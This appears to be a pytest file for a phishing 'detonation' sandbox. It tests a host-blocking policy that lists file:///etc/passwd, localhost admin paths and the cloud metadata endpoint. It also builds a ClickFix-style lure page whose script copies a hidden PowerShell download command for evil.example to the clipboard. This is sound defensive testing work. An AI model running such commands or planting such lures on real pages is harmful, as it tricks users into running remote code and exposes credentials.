"""Tests for the sandboxed detonation engine.

The argument-guard, host-policy and missing-dependency paths are fast and always run.
The actual browser render is marked ``slow`` and skipped when Playwright (or its
Chromium) is unavailable. Every render uses an **inline** HTML document loaded as a
``data:`` URL, so no external network is touched — the detonation's own request router
also blocks any sub-resource load.
"""

from __future__ import annotations

import pytest

from uniphish.intel import detonate as det
from uniphish.intel.detonate import DetonationResult, detonate, playwright_available


# --------------------------------------------------------------------------- fast paths
def test_playwright_available_returns_bool():
    assert isinstance(playwright_available(), bool)


async def test_requires_exactly_one_input():
    both = await detonate(url="https://x.test/", html="<html></html>")
    assert both.error and "exactly one" in both.error
    neither = await detonate()
    assert neither.error and "exactly one" in neither.error


async def test_skips_cleanly_when_playwright_missing(monkeypatch):
    monkeypatch.setattr(det, "playwright_available", lambda: False)
    res = await detonate(html="<html><body>hi</body></html>")
    assert isinstance(res, DetonationResult)
    assert res.error == "playwright not installed"
    assert not res.ok


@pytest.mark.parametrize(
    ("url", "blocked"),
    [
        ("https://good.example/path", False),
        ("http://good.example/path", False),
        ("data:text/html,<html></html>", False),
        ("about:blank", False),
        ("file:///etc/passwd", True),
        ("chrome://settings", True),
        ("ftp://host.example/x", True),
        ("http://127.0.0.1/admin", True),
        ("http://localhost/admin", True),
        ("http://169.254.169.254/latest/meta-data/", True),
        ("http://[::1]/", True),
    ],
)
def test_host_policy_blocks_dangerous_requests(url, blocked):
    assert det._host_is_blocked(url, allow_private=False) is blocked


def test_host_policy_can_allow_private():
    assert det._host_is_blocked("http://127.0.0.1/admin", allow_private=True) is False


# --------------------------------------------------------------------------- live render
requires_browser = pytest.mark.skipif(
    not playwright_available(), reason="Playwright not installed")


@pytest.mark.slow
@requires_browser
async def test_render_inline_html_basic():
    html = ("<!doctype html><html><head><title>Account Verify</title></head>"
            "<body><h1>Please sign in</h1><p>welcome</p></body></html>")
    res = await detonate(html=html, timeout_s=15.0, settle_ms=300)
    if res.error and "executable" in res.error.lower():  # browser binary absent
        pytest.skip(f"browser unavailable: {res.error}")
    assert res.ok, res.error
    assert res.title == "Account Verify"
    assert "Please sign in" in res.dom_html
    assert (res.final_url or "").startswith("data:text/html")
    assert res.elapsed_ms >= 0.0


@pytest.mark.slow
@requires_browser
async def test_render_inline_html_captures_clipboard_write():
    # Inert ClickFix-style payload (reserved example domain, obviously non-functional).
    payload = 'powershell -w hidden -c "iwr https://evil.example/a.ps1"'
    html = (
        "<!doctype html><html><head><title>Human check</title></head><body>"
        "<p>verify you are human: press Win+R and paste</p>"
        "<script>navigator.clipboard.writeText("
        f"{payload!r}).catch(function(e){{}});</script>"
        "</body></html>"
    )
    res = await detonate(html=html, timeout_s=15.0, settle_ms=600)
    if res.error and "executable" in res.error.lower():
        pytest.skip(f"browser unavailable: {res.error}")
    assert res.ok, res.error
    assert res.clipboard_writes, "expected the clipboard write to be captured"
    assert "evil.example" in res.clipboard_writes[0]
